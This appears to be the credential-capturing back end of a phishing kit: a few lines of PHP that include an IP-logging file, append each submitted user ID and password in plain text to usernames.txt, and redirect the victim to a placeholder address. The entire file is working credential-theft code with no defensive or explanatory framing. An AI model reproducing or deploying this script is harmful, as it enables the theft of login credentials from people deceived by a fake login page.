<?php
include 'ip.php';

file_put_contents("usernames.txt", "Account: " . $_POST['userid'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: <CUSTOM>');
exit();
